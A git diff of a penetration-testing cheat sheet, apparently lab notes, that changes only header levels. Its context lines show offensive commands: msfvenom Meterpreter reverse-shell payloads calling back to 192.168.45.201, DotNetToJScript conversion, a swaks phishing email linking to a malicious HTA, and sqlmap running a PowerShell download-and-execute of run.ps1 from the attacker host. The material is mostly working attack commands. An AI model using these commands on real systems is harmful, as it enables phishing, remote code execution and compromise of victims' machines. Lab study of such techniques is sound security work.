@@ -144,7 +144,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXI
 	set EXITFUNC thread
 ```
 
-### Phishing + DotNetToJScript
+#### Phishing + DotNetToJScript
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 -f csharp
 DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js
@@ -152,7 +152,7 @@ DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js
 sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168.45.201/download.hta
 ```
 
-### SQLmap (OS-Shell) 
+#### SQLmap (OS-Shell) 
 ```
 sqlmap -r post.req -p artist --os-shell
 sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
